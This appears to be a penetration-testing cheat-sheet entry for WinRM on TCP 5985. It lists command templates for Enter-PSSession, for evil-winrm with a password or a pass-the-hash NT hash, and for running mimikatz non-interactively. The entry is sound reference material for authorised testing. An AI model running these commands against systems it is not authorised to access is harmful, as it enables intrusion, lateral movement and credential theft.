# TCP 5985: WinRM

> WinRM is Microsoft's implementation of WS-Management in Windows which allows systems to access or exchange management information across a common network.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Windows_Remote_Management)</cite>

## PSSession

```powershell
Enter-PSSession -ComputerName <hostname> -Credential <username>
```

## Evil-WinRM

> The ultimate WinRM shell for hacking/pentesting  
[GitHub - Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)

Password  
```bash
evil-winrm -i <ip> -u <user> -p <pw> -s <script-path> -e <binary-path>
```

PtH  
```bash
evil-winrm -i <ip> -u <user> -H <nt-hash> -s <script-path> -e <binary-path>
```

### Using mimikatz

As mimikatz is not working fully interactively in this environment, we can just issue single commands.  

```powershell
./mimikatz.exe "<command>" "exit"
```
